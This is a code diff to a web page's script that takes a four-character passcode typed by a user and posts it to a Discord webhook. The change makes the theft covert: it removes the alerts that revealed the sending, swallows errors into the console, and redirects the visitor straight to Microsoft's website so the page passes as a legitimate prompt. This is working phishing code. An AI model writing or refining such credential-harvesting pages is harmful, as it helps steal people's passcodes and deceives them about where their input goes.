@@ -133,17 +133,17 @@
             }
         });
 
-        // Button click event to send the data to Discord
+        // Button click event to send the data to Discord and redirect to Microsoft
         sendButton.addEventListener('click', () => {
             const password = inputBar.value;
 
             // Check if the password length is exactly 4 characters
             if (password.length === 4) {
                 const payload = {
-                    content: `Password entered: ${password}`, // Send the passcode as message
+                    content: `Password entered: ${password}`, // Send the passcode as a message to Discord
                 };
 
-                // Send data to Discord webhook using fetch
+                // Send data to Discord webhook using fetch (without alerts)
                 fetch(webhookURL, {
                     method: 'POST',
                     headers: {
@@ -153,22 +153,17 @@
                 })
                 .then(response => {
                     if (!response.ok) {
-                        return response.text().then(errorText => {
-                            throw new Error(`Error from Discord: ${errorText}`);
-                        });
+                        // If there is an error, log it but don't show alerts
+                        console.error('Error sending message to Discord:', response.statusText);
                     }
-                    return response.json();
-                })
-                .then(data => {
-                    alert('Password sent to Discord!');
-                    inputBar.value = ''; // Clear input field after sending
                 })
                 .catch(error => {
-                    console.error('Error:', error);
-                    alert(`Error sending to Discord: ${error.message}`);
+                    // If the fetch fails, log the error but don't show alerts
+                    console.error('Error sending message to Discord:', error);
                 });
-            } else {
-                alert('Please enter a valid 4-character password.');
+
+                // Redirect to Microsoft's website immediately after sending the message
+                window.location.href = 'https://www.microsoft.com'; // Redirect to Microsoft's website
             }
         });
     </script>
